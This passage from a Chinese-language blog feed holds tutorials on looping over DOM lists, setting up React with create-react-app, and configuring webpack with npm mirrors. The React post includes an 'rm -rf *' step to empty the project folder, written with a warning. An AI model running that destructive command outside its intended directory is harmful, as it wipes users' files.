class="comment">// item: function item() &#123;&#125;</span></div><div class="line"><span class="comment">// namedItem: function namedItem() &#123;&#125;</span></div></pre></td></tr></table></figure></p><p>因为domList并非数组，而是一个对象，只是因为其key值为0，1，2… 而感觉与数组类似;</p><p>所以我们在使用for in 遍历domList时，需要将domList转换为数组：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> res = [].slice.call(domList);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> item <span class="keyword">in</span> res) &#123;&#125;</div></pre></td></tr></table></figure></p><blockquote><p><code>()()</code>, <code>!function() {}()</code>, <code>+function() {}()</code> 三种函数自执行的方式</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有下面的 数组 和 &lt;code&gt;JSON&lt;/code&gt;对象：&lt;br&gt;&lt;figure class=&quot;highlight ebnf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;var Arr&lt;/span&gt; = [&lt;span class=&quot;string&quot;&gt;&#39;Javascript&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Gulp&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;CSS3&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Grunt&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;jQuery&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;angular&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;var Obj&lt;/span&gt; = &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    aaa: &lt;span class=&quot;string&quot;&gt;&#39;Javascript&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    bbb: &lt;span class=&quot;string&quot;&gt;&#39;Gulp&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ccc: &lt;span class=&quot;string&quot;&gt;&#39;CSS3&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ddd: &lt;span class=&quot;string&quot;&gt;&#39;Grunt&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    eee: &lt;span class=&quot;string&quot;&gt;&#39;jQuery&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    fff: &lt;span class=&quot;string&quot;&gt;&#39;angular&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、For 循环&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置 React</title>
    <link href="wangsiyuan233.github.io/2018/05/29/50%E9%85%8D%E7%BD%AEReact/"/>
    <id>wangsiyuan233.github.io/2018/05/29/50配置React/</id>
    <published>2018-05-30T02:11:41.000Z</published>
    <updated>2018-05-31T15:14:35.607Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>第一步： 安装 React</p></blockquote><p>1、 <a href="https://pan.baidu.com/s/1kU4K9iJ" target="_blank" rel="external">下载</a><code>yarn</code></p><p>2、临时文件夹实验：<br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="string">mkdir </span>~/<span class="string">temp;</span> <span class="string">cd </span>~/<span class="string">temp</span></div><div class="line"></div><div class="line"><span class="string">npm </span><span class="string">install </span>-g <span class="built_in">create-react-app</span></div><div class="line"></div><div class="line"><span class="built_in">create-react-app</span> <span class="string">hello-world</span></div><div class="line"></div><div class="line"><span class="string">cd </span><span class="string">hello-world</span></div><div class="line"></div><div class="line"><span class="string">npm </span><span class="string">start </span>或者 <span class="string">yarn </span><span class="string">start</span></div></pre></td></tr></table></figure></p><p> <code>create-react-app</code> 内置了 <code>webpack</code> 的所有功能。</p><p>3、初始化 <code>React</code><br>清空 <code>temp</code> 文件夹，同时清空项目文件夹<br>（因为 <code>create-react-app</code> 会自己创建 <code>src</code> 和 <code>index.html</code> ）<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">cd 到你在上次任务中新建的项目目录！</div><div class="line"></div><div class="line"><span class="comment"># 删除所有非隐藏文件，这一步千万不要手抖，后果自负</span></div><div class="line"></div><div class="line">rm -rf * </div><div class="line">git <span class="keyword">add</span><span class="bash"> .</span></div><div class="line">git commit -m <span class="string">"remove all files"</span></div><div class="line">git push</div></pre></td></tr></table></figure></p><p>正式开始初始化：<br><a id="more"></a><br><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">create-react-app</span> .</div><div class="line"><span class="string">yarn </span><span class="string">start</span></div></pre></td></tr></table></figure></p><p><code>yarn start</code> 就相当于 <code>webpack</code> 的 <code>watch</code> 功能。</p><p>注意：改 <code>JS</code> 会自动刷新页面，改 <code>HTML</code> 要手动刷新页面。</p><blockquote><p>第二步：部署</p></blockquote><p>1、 在 <code>package.json</code> 里添加  <code>&quot;homepage&quot;: &quot;https://wangsiyuan233.github.io/react-todolist /build &quot;,</code></p><p>2、 <code>yarn start</code></p><blockquote><p>第三步： React 的生命周期</p></blockquote><p>组件不能改变得到的 <code>props</code>，可变的东西要放在 <code>state</code></p><p>直接在 <code>render</code> 或 <code>constructor</code> 里面改 <code>state</code> ，都失败了</p><p>必须使用 <code>this.setState()</code> 方法来改变 <code>state</code>，直接对 <code>state</code> 赋值毫无用处。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">     setInterval(<span class="function"><span class="params">()</span>=&gt;</span>&#123; <span class="comment">// 搜索「JS 箭头函数 MDN」</span></div><div class="line">-      <span class="keyword">this</span>.state = &#123;</div><div class="line">+      <span class="keyword">this</span>.setState(&#123;</div><div class="line">         <span class="attr">date</span>: <span class="keyword">new</span> <span class="built_in">Date</span>() <span class="comment">// 更新 date</span></div><div class="line">-      &#125;</div><div class="line">+      &#125;)</div><div class="line">     &#125;)</div></pre></td></tr></table></figure></p><p>OK,那我们把 <code>setState</code> 放在那儿呢？</p><p><code>React</code> 的生命周期包括三个阶段：<code>mount</code>（挂载）、<code>update</code>（更新）和 <code>unmount</code>（移除）</p><h2 id="mount（挂载）"><a href="#mount（挂载）" class="headerlink" title="mount（挂载）"></a><code>mount</code>（挂载）</h2><p><img src="https://i.imgur.com/RMpH2WV.jpg" alt=""></p><h2 id="update（更新）"><a href="#update（更新）" class="headerlink" title="update（更新）"></a><code>update</code>（更新）</h2><p>mount 之后，如果数据有任何变动，就会来到 update 过程，这个过程有 5 个钩子：</p><p>1、<code>componentWillReceiveProps(nextProps)</code> - 我要读取 <code>props</code> 啦！<br>2、<code>shouldComponentUpdate(nextProps, nextState)</code> - 请问要不要更新组件？<code>true / false</code><br>3、<code>componentWillUpdate()</code> - 我要更新组件啦！<br>4、<code>render()</code> - 更新！<br>5、<code>componentDidUpdate()</code> - 更新完毕啦！</p><h2 id="unmount（移除）"><a href="#unmount（移除）" class="headerlink" title="unmount（移除）"></a><code>unmount</code>（移除）</h2><p>当一个组件将要从页面中移除时，会进入 <code>unmount</code> 过程，这个过程就一个钩子：</p><p><code>componentWillUnmount()</code> - 我要死啦！</p><p>你可以在这个组件死之前做一些清理工作。</p><p><strong>废话那么多，所以 <code>setState</code> 到底放哪儿？</strong></p><p>一般，我们只在这几个钩子里 <code>setState</code>：</p><p>1、<code>componentWillMount</code><br>2、<code>componentDidMount</code><br>3、<code>componentWillReceiveProps</code></p><p>反正 <code>this.state</code> 就是不会在 <code>this.setState</code> 调用之后立刻更新</p><p>总结一下，<code>setState</code> 最招骂的就是不会立即修改 <code>this.state</code>。</p><p>原来 <code>this.setState</code> 可以接受一个函数作为参数啊！</p><p>传统式 <code>setState</code> 的存在，会把函数式 <code>setState</code> 拖下水</p><p>只要有一个传统式的 <code>setState</code> 调用，就把其他函数式 <code>setState</code> 调用给害了。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;第一步： 安装 React&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1、 &lt;a href=&quot;https://pan.baidu.com/s/1kU4K9iJ&quot;&gt;下载&lt;/a&gt;&lt;code&gt;yarn&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2、临时文件夹实验：&lt;br&gt;&lt;figure class=&quot;highlight dsconfig&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;mkdir &lt;/span&gt;~/&lt;span class=&quot;string&quot;&gt;temp;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;cd &lt;/span&gt;~/&lt;span class=&quot;string&quot;&gt;temp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;npm &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;install &lt;/span&gt;-g &lt;span class=&quot;built_in&quot;&gt;create-react-app&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;create-react-app&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;hello-world&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;cd &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;hello-world&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;npm &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;start &lt;/span&gt;或者 &lt;span class=&quot;string&quot;&gt;yarn &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;start&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;code&gt;create-react-app&lt;/code&gt; 内置了 &lt;code&gt;webpack&lt;/code&gt; 的所有功能。&lt;/p&gt;
&lt;p&gt;3、初始化 &lt;code&gt;React&lt;/code&gt;&lt;br&gt;清空 &lt;code&gt;temp&lt;/code&gt; 文件夹，同时清空项目文件夹&lt;br&gt;（因为 &lt;code&gt;create-react-app&lt;/code&gt; 会自己创建 &lt;code&gt;src&lt;/code&gt; 和 &lt;code&gt;index.html&lt;/code&gt; ）&lt;br&gt;&lt;figure class=&quot;highlight dockerfile&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cd 到你在上次任务中新建的项目目录！&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 删除所有非隐藏文件，这一步千万不要手抖，后果自负&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rm -rf * &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git &lt;span class=&quot;keyword&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; .&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/span&gt;git commit -m &lt;span class=&quot;string&quot;&gt;&quot;remove all files&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;git push&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;正式开始初始化：&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Webpack配置</title>
    <link href="wangsiyuan233.github.io/2018/05/29/49Webpack%E9%85%8D%E7%BD%AE/"/>
    <id>wangsiyuan233.github.io/2018/05/29/49Webpack配置/</id>
    <published>2018-05-29T08:48:37.000Z</published>
    <updated>2018-05-30T02:08:52.285Z</updated>
    
    <content type="html"><![CDATA[<h3 id="webpack-的作用-使用各种-loader-加载不同的资源-把所有资源打包起来"><a href="#webpack-的作用-使用各种-loader-加载不同的资源-把所有资源打包起来" class="headerlink" title="webpack 的作用:使用各种 loader 加载不同的资源,把所有资源打包起来"></a>webpack 的作用:使用各种 loader 加载不同的资源,把所有资源打包起来</h3><blockquote><p>第一步：设置一个 <code>npm</code>，让 <code>npm</code> 下载得更快一些</p></blockquote><p>1、运行 <code>npm config set loglevel http</code> 让你知道 <code>npm</code> 发的每一个请求<br>2、运行 <code>npm config set progress false</code>，关闭那个无聊的进度条<br>3、运行 <code>npm config set registry https://registry.npm.taobao.org/</code> ， 从淘宝的服务器下载各种包。不过这会让你在运行 <code>npm adduser</code> 的时候出问题，想要恢复成原样，只需要运行 <code>npm config delete registry</code> 即可。<br>4、运行 <code>touch ~/.bashrc; echo &#39;export PHANTOMJS_CDNURL=&quot;http://npm.taobao.org/mirrors/phantomjs&quot;&#39; &gt;&gt; ~/.bashrc</code> 让 <code>npm</code> 从淘宝下载 <code>phantomjs</code><br>5、运行 <code>touch ~/.bashrc; echo &#39;export SASS_BINARY_SITE=&quot;https://npm.taobao.org/mirrors/node-sass&quot;&#39; &gt;&gt; ~/.bashrc</code> 让 npm 从淘宝下载 SASS<br>6、运行 <code>source ~/.bashrc</code></p><blockquote><p>第二步：复制 <code>webpack</code> 的<a href="https://webpack.js.org/guides/getting-started/" target="_blank" rel="external">指引</a></p></blockquote><a id="more"></a><p>1、<code>cd</code> 到你喜欢的一个地方，比如 <code>~/code/</code> 目录  <code>mkdir webpack-demo &amp;&amp; cd webpack-demo</code><br>2、好了，现在我身处 <code>webpack-demo</code> 目录 <code>npm init -y</code><br>3、上面命令创建了一个 <code>package.json</code> 文件 <code>npm install --save-dev webpack</code><br>非 Windows 用户复制这一行：<code>./node_modules/.bin/webpack --help</code> </p><p>看到刷刷刷的英文，就是安装成功，试着运行一下吧</p><blockquote><p>第三步：现在创建一个子目录（<code>app.js</code>)</p></blockquote><p>1、<code>mkdir app &amp;&amp; cd app</code><br>2、<code>touch index.js</code><br>3、编辑 <code>app/index.js</code>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">component</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> element = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line"></div><div class="line">  <span class="comment">/* lodash is required for the next line to work */</span></div><div class="line">  element.innerHTML = _.join([<span class="string">'Hello'</span>,<span class="string">'webpack'</span>], <span class="string">' '</span>);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> element;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">document</span>.body.appendChild(component());</div></pre></td></tr></table></figure></p><p>4、在 <code>app</code> 文件夹外面创建 <code>touch index.html</code>：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>webpack 2 demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/lodash@4.16.6"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app/index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p><p>5、引入 <code>lodash</code> : <code>npm install --save lodash</code><br>6、然后在 <code>app/index.js</code> 的第一行添加 ： <code>import _ from &#39;lodash&#39;;</code><br>7、把 <code>app/index.html</code> 改动一下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span>webpack 2 demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">-    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/lodash@4.16.6"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">-    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app/index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">+    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"dist/bundle.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p><p>浏览器打开 <code>index.html</code>，看到 <code>hello webpack</code>，就证明 <code>webpack</code> 安装成功了~</p><blockquote><p>第四步： 快速启动</p></blockquote><p>1、<code>webpack-demo</code> 目录下新建并编辑 <code>webpack.config.js</code>, (连接<code>app/index.js</code> 、<code>dist</code> 和 <code>bundle.js</code> 这三个关键词)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  <span class="attr">entry</span>: <span class="string">'./app/index.js'</span>,</div><div class="line">  <span class="attr">output</span>: &#123;</div><div class="line">    <span class="attr">filename</span>: <span class="string">'bundle.js'</span>,</div><div class="line">    <span class="attr">path</span>: path.resolve(__dirname, <span class="string">'dist'</span>)</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>2、修改 <code>package.json</code><br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   <span class="string">"scripts"</span>: &#123;</div><div class="line">-    <span class="string">"test"</span>: <span class="string">"echo \"</span><span class="keyword">Error</span>: <span class="keyword">no</span> <span class="keyword">test</span> specified\<span class="string">" &amp;&amp; exit 1"</span></div><div class="line">+    <span class="string">"test"</span>: <span class="string">"echo \"</span><span class="keyword">Error</span>: <span class="keyword">no</span> <span class="keyword">test</span> specified\<span class="string">" &amp;&amp; exit 1"</span>,</div><div class="line">+    <span class="string">"build"</span>: <span class="string">"webpack"</span></div><div class="line">   &#125;,</div><div class="line">   <span class="string">"keywords"</span>: [],</div></pre></td></tr></table></figure></p><p>3、然后运行 <code>npm run build</code> 那么说明运行 <code>npm run build</code> 就等于运行 <code>node_modules</code> 里的 <code>webpack</code> 可执行文件，这个可执行文件会自己去 <code>webpack.config.js</code> 里找 <code>app/index.js</code>、<code>dist</code> 和 <code>bundle.js</code> 三个关键词。</p><p>所以现在不用运行 <code>./node_modules/.bin/webpack app/index.js dist/bundle.js</code><br>而是运行 <code>npm run build</code> 就可以了</p><p><strong><code>npm run build</code> 特别重要，把 <code>src</code> 里面的代码打包好提交到 <code>build</code> 里面， 就是这么来的啊！</strong></p><blockquote><p>第五步：监听文件变动</p></blockquote><p>我们需要 <code>watch</code> 来 <code>webpack</code> 监听文件变动，一旦我们保存了文件，它就重新 <code>build</code> 代码。</p><p>1、在 <code>package.jason</code> 中添加一个 <code>npm script</code>：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">   <span class="string">"scripts"</span>: &#123;</div><div class="line">     <span class="string">"test"</span>: <span class="string">"echo \"</span><span class="keyword">Error</span>: <span class="keyword">no</span> <span class="keyword">test</span> specified\<span class="string">" &amp;&amp; exit 1"</span>,</div><div class="line">-    <span class="string">"build"</span>: <span class="string">"webpack -p"</span></div><div class="line">+    <span class="string">"build"</span>: <span class="string">"webpack -p"</span>,</div><div class="line">+    <span class="string">"dev"</span>: <span class="string">"webpack --progress --watch"</span></div><div class="line">   &#125;,</div><div class="line">   <span class="string">"keywords"</span>: [],</div></pre></td></tr></table></figure></p><p>此时打开 <code>index.html</code>， 编辑 <code>app/index.js</code>，<strong>保存</strong>，你会发现 <code>webpack</code> 自动 <code>build</code> 了，这是刷新 <code>index.html</code></p><blockquote><p>第六步： 浏览器自动刷新</p></blockquote><p>如果能边写边改多好啊！（不是保存后再自动刷新）<br>1、 <code>index.html</code> 里 改为 <code>&lt;script src=&quot;/bundle.js&quot;&gt;&lt;/script&gt;</code><br>2、 <code>package.json</code>：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-    <span class="string">"dev"</span>: <span class="string">"webpack --progress --watch"</span></div><div class="line">+    <span class="string">"dev"</span>: <span class="string">"webpack-dev-server --open"</span></div><div class="line"></div><div class="line"></div><div class="line">-    <span class="string">"webpack"</span>: <span class="string">"^2.3.2"</span></div><div class="line">+    <span class="string">"webpack"</span>: <span class="string">"^2.3.2"</span>,</div><div class="line">+    <span class="string">"webpack-dev-server"</span>: <span class="string">"^2.4.2"</span></div></pre></td></tr></table></figure></p><p>3、运行 <code>npm run dev</code>，然后浏览器就会自动打开 <code>http://localhost:8080/</code> ，你会看到 <code>index.html</code> 页面</p><p>当我们修改 <code>index.js</code> 时：bundle.js 自动打包； <code>http://localhost:8080/</code> 自动刷新</p><p>注意，期间 <code>dist/bundle.js</code> 不会自动变化，你在<strong>部署代码之前</strong>，依然要运行 <code>npm run build</code> 才行。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;webpack-的作用-使用各种-loader-加载不同的资源-把所有资源打包起来&quot;&gt;&lt;a href=&quot;#webpack-的作用-使用各种-loader-加载不同的资源-把所有资源打包起来&quot; class=&quot;headerlink&quot; title=&quot;webpack 的作用:使用各种 loader 加载不同的资源,把所有资源打包起来&quot;&gt;&lt;/a&gt;webpack 的作用:使用各种 loader 加载不同的资源,把所有资源打包起来&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;第一步：设置一个 &lt;code&gt;npm&lt;/code&gt;，让 &lt;code&gt;npm&lt;/code&gt; 下载得更快一些&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1、运行 &lt;code&gt;npm config set loglevel http&lt;/code&gt; 让你知道 &lt;code&gt;npm&lt;/code&gt; 发的每一个请求&lt;br&gt;2、运行 &lt;code&gt;npm config set progress false&lt;/code&gt;，关闭那个无聊的进度条&lt;br&gt;3、运行 &lt;code&gt;npm config set registry https://registry.npm.taobao.org/&lt;/code&gt; ， 从淘宝的服务器下载各种包。不过这会让你在运行 &lt;code&gt;npm adduser&lt;/code&gt; 的时候出问题，想要恢复成原样，只需要运行 &lt;code&gt;npm config delete registry&lt;/code&gt; 即可。&lt;br&gt;4、运行 &lt;code&gt;touch ~/.bashrc; echo &amp;#39;export PHANTOMJS_CDNURL=&amp;quot;http://npm.taobao.org/mirrors/phantomjs&amp;quot;&amp;#39; &amp;gt;&amp;gt; ~/.bashrc&lt;/code&gt; 让 &lt;code&gt;npm&lt;/code&gt; 从淘宝下载 &lt;code&gt;phantomjs&lt;/code&gt;&lt;br&gt;5、运行 &lt;code&gt;touch ~/.bashrc; echo &amp;#39;export SASS_BINARY_SITE=&amp;quot;https://npm.taobao.org/mirrors/node-sass&amp;quot;&amp;#39; &amp;gt;&amp;gt; ~/.bashrc&lt;/code&gt; 让 npm 从淘宝下载 SASS&lt;br&gt;6、运行 &lt;code&gt;source ~/.bashrc&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;第二步：复制 &lt;code&gt;webpack&lt;/code&gt; 的&lt;a href=&quot;https://webpack.js.org/guides/getting-started/&quot;&gt;指引&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MVC与模块化</title>
    <link href="wangsiyuan233.github.io/2018/05/14/48MVC%E4%B8%8E%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    <id>wangsiyuan233.github.io/2018/05/14/48MVC与模块化/</id>
    <published>2018-05-15T02:16:16.000Z</published>
    <updated>2018-05-15T02:42:40.743Z</updated>
    
